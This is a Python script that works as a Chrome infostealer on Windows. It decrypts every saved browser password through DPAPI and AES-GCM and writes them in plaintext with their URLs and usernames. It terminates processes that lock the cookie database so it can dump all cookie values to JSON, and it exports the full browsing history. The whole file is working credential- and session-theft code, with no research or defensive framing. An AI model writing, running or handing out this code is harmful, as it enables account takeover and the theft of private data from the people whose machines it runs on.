# Imports
import shutil
import psutil
import sqlite3
import json
import os
import re
import sys
import base64
import win32crypt
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES

#  ===============================================================

# For Extract Passwords
def extract_passwords():
    # GLOBAL CONSTANT
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            # (1) Get secret key from chrome local state
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print(f"[ERR] Chrome secret key cannot be found: {e}")
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            return decrypted_pass.decode()  
        except Exception as e:
            print(f"[ERR] Unable to decrypt, Chrome version <80 not supported: {e}")
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print(f"[ERR] Chrome database cannot be found: {e}")
            return None

    try:
        # Create a text file to store passwords
        with open('decrypted_passwords.txt', mode='w', encoding='utf-8') as decrypt_password_file:
            secret_key = get_secret_key()
            if not secret_key:
                print("[ERR] Secret key not found, exiting...")
                sys.exit(1)
                
            # Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            
            for folder in folders:
                # (2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if url and username and ciphertext:
                            # (3) Decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            # Save into text file with a readable format
                            decrypt_password_file.write(f"Sequence: {index}\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*'*50}\n")
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print(f"[ERR] {e}")

# ======================================================================================================

# For Extract Cookies
def extract_cookies():
    # Cookies file path
    user_path = os.path.expanduser('~')
    cookie_db = os.path.join(user_path, r'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies')
    temp_cookie_db = os.path.join(user_path, 'chrome_temp_cookies.db')
    output_file = os.path.join(user_path, 'chrome_cookies.txt')  # Output file for storing cookies

    # File lock function
    def unlock_file(filepath):
        for proc in psutil.process_iter(['pid', 'name', 'open_files']):
            try:
                open_files = proc.info['open_files']
                if open_files:
                    for file in open_files:
                        if file.path == filepath:
                            proc.terminate()  # Close the process that locked the file
                            proc.wait()  # Wait for the process to close completely
                            return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return False

    # Lock the file and then copy it
    if unlock_file(cookie_db):
        try:
            shutil.copy2(cookie_db, temp_cookie_db)
            print("File copied successfully after unlocking.")
        except Exception as e:
            print(f"Failed to copy file: {e}")
    else:
        print(f"Could not unlock file: {cookie_db}")

    # Extracting cookies from the database and saving them in a text file
    try:
        conn = sqlite3.connect(temp_cookie_db)
        cursor = conn.cursor()

        # Running a query to get cookie information
        cursor.execute('SELECT host_key, name, value, path, expires_utc, last_access_utc, is_secure FROM cookies')

        cookies = []
        for row in cursor.fetchall():
            cookie = {
                'host': row[0],
                'name': row[1],
                'value': row[2],
                'path': row[3],
                'expires': row[4],
                'last_access': row[5],
                'is_secure': bool(row[6])
            }
            cookies.append(cookie)

        # Storing cookies in JSON text file
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(cookies, f, indent=4, ensure_ascii=False)

        print(f"Cookies successfully saved to {output_file}")

    except Exception as e:
        print(f"Failed to extract cookies: {e}")

    finally:
        if conn:
            conn.close()

    # Delete the temporary database file
    if os.path.exists(temp_cookie_db):
        os.remove(temp_cookie_db)
        print("Temporary database file removed.")


# =========================================================

# For Extract History

# Chrome history file path on Windows
user_path = os.path.expanduser('~')
history_db = os.path.join(user_path, r'AppData\Local\Google\Chrome\User Data\Default\History')

# Path to temporary file to copy history to
temp_history_db = os.path.join(user_path, 'chrome_temp_history.db')

# Copy history file to temporary file
shutil.copy2(history_db, temp_history_db)

# Connect to a temporary database
conn = sqlite3.connect(temp_history_db)
cursor = conn.cursor()

# Running a query to extract the history
cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")

# Convert chrome time to human understandable time
def chrome_time_to_readable(chrome_time):
    epoch_start = datetime(1601, 1, 1)
    return epoch_start + timedelta(microseconds=chrome_time)

# History extraction and display
with open("chrome_history.txt", "w", encoding="utf-8") as f:
    f.write(f"{'URL':<100}{'Title':<60}{'Visit Count':<15}{'Last Visit Time'}\n")
    f.write("="*160 + "\n")
    for row in cursor.fetchall():
        url = row[0]
        title = row[1]
        visit_count = row[2]
        last_visit_time = chrome_time_to_readable(row[3])
        f.write(f"{url:<100}{title:<60}{visit_count:<15}{last_visit_time}\n")

# Close the database connection
conn.close()

# Delete the temporary file
os.remove(temp_history_db)


if __name__ == "__main__":
    extract_passwords()
    extract_cookies()